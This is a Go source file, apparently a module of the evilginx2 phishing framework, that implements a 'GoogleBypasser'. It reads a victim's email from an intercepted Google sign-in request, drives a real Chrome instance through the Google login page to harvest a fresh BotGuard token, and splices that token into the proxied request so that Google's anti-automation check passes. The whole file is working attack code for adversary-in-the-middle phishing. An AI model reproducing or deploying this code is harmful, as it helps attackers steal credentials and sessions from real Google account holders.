 package core

 import (
 	"bytes"
 	"encoding/json"
 	"fmt"
 	"net/http"
 	"net/url"
 	"regexp"
 	"strings"
 	"sync"
 	"time"

 	"github.com/go-rod/rod"
 	"github.com/go-rod/rod/lib/input"
 	"github.com/go-rod/rod/lib/proto"
 	"github.com/kgretzky/evilginx2/log"
 )

 type GoogleBypasser struct {
 	browser        *rod.Browser
 	page           *rod.Page
 	isHeadless     bool
 	withDevTools   bool
 	slowMotionTime time.Duration

 	token string
 	email string
 }

 var bgRegexp = regexp.MustCompile(`identity-signin-identifier\\",\\"([^"]+)`)

 // func (b *GoogleBypasser) Launch() {
 // 	log.Debug("[GoogleBypasser]: : Launching Browser .. ")
 // 	u := launcher.New().
 // 		Headless(b.isHeadless).
 // 		Devtools(b.withDevTools).
 // 		NoSandbox(true).
 // 		MustLaunch()
 // 	b.browser = rod.New().ControlURL(u)
 // 	if b.slowMotionTime > 0 {
 // 		b.browser = b.browser.SlowMotion(b.slowMotionTime)
 // 	}
 // 	b.browser = b.browser.MustConnect()
 // 	b.page = stealth.MustPage(b.browser)
 // }

 func getWebSocketDebuggerURL() (string, error) {
 	resp, err := http.Get("http://127.0.0.1:9222/json")
 	if err != nil {
 		return "", err
 	}
 	defer resp.Body.Close()

 	var targets []map[string]interface{}
 	if err := json.NewDecoder(resp.Body).Decode(&targets); err != nil {
 		return "", err
 	}

 	if len(targets) == 0 {
 		return "", fmt.Errorf("no targets found")
 	}

 	return targets[0]["webSocketDebuggerUrl"].(string), nil
 }

 // Use https://bot.sannysoft.com/ to test the Headless Browser detection. Just open that url in automated browser and check result.

 func (b *GoogleBypasser) Launch() {
 	log.Debug("[GoogleBypasser]: Launching Browser .. ")

 	wsURL, err := getWebSocketDebuggerURL()
 	if err != nil {
 		log.Error("Failed to get WebSocket debugger URL: %v", err)
 	}

 	b.browser = rod.New().ControlURL(wsURL)
 	if b.slowMotionTime > 0 {
 		b.browser = b.browser.SlowMotion(b.slowMotionTime)
 	}

 	b.browser = b.browser.MustConnect()

 	b.page = b.browser.MustPage()

 	log.Debug("[GoogleBypasser]: Browser connected and page created.")
 }

 func (b *GoogleBypasser) GetEmail(body []byte) {
 	//exp := regexp.MustCompile(`f\.req=\[\[\["V1UmUe","\[null,\\"(.*?)\\"`)
 	exp := regexp.MustCompile(`f\.req=\[\[\["V1UmUe","\[null,\\"(.*?)\\"`)
 	email_match := exp.FindSubmatch(body)
 	matches := len(email_match)
 	if matches < 2 {
 		log.Error("[GoogleBypasser]: Found %v matches for email in request.", matches)
 		return
 	}
 	log.Debug("[GoogleBypasser]: Found email in body : %v", string(email_match[1]))
 	b.email = string(bytes.Replace(email_match[1], []byte("%40"), []byte("@"), -1))
 	log.Debug("[GoogleBypasser]: Using email to obtain valid token : %v", b.email)
 }

 func (b *GoogleBypasser) GetToken() {
 	stop := make(chan struct{})
 	var once sync.Once
 	timeout := time.After(200 * time.Second)

 	go b.page.EachEvent(func(e *proto.NetworkRequestWillBeSent) {
 		if strings.Contains(e.Request.URL, "/v3/signin/_/AccountsSignInUi/data/batchexecute?") && strings.Contains(e.Request.URL, "rpcids=V1UmUe") {

 			decodedBody, err := url.QueryUnescape(string(e.Request.PostData))
 			if err != nil {
 				log.Error("Failed to decode body while trying to obtain fresh botguard token: %v", err)
 				return
 			}
 			b.token = bgRegexp.FindString(decodedBody)
 			log.Debug("[GoogleBypasser]: Obtained Token : %v", b.token)
 			once.Do(func() { close(stop) })
 		}
 	})()

 	log.Debug("[GoogleBypasser]: Navigating to Google login page ...")
 	err := b.page.Navigate("https://accounts.google.com/")
 	if err != nil {
 		log.Error("Failed to navigate to Google login page: %v", err)
 		return
 	}

 	log.Debug("[GoogleBypasser]: Waiting for the email input field ...")
 	emailField := b.page.MustWaitLoad().MustElement("#identifierId")
 	if emailField == nil {
 		log.Error("Failed to find the email input field")
 		return
 	}

 	err = emailField.Input(b.email)
 	if err != nil {
 		log.Error("Failed to input email: %v", err)
 		return
 	}
 	log.Debug("[GoogleBypasser]: Entered target email : %v", b.email)

 	err = b.page.Keyboard.Press(input.Enter)
 	if err != nil {
 		log.Error("Failed to submit the login form: %v", err)
 		return
 	}
 	log.Debug("[GoogleBypasser]: Submitted Login Form ...")

 	select {
 	case <-stop:
 		for b.token == "" {
 			select {
 			case <-time.After(1 * time.Second):
 				log.Printf("[GoogleBypasser]: Waiting for token to be obtained...")
 			case <-timeout:
 				log.Printf("[GoogleBypasser]: Timed out while waiting to obtain the token")
 				return
 			}
 		}
 		//log.Printf("[GoogleBypasser]: Successfully obtained token: %v", b.token)
 		// Close the page after obtaining the token
 		err := b.page.Close()
 		if err != nil {
 			log.Error("Failed to close the page: %v", err)
 		}
 	case <-timeout:
 		log.Printf("[GoogleBypasser]: Timed out while waiting to obtain the token")
 		return
 	}
 }

 func (b *GoogleBypasser) ReplaceTokenInBody(body []byte) []byte {
 	log.Debug("[GoogleBypasser]: Old body : %v", string(body))
 	newBody := bgRegexp.ReplaceAllString(string(body), b.token)
 	log.Debug("[GoogleBypasser]: New body : %v", newBody)
 	return []byte(newBody)
 }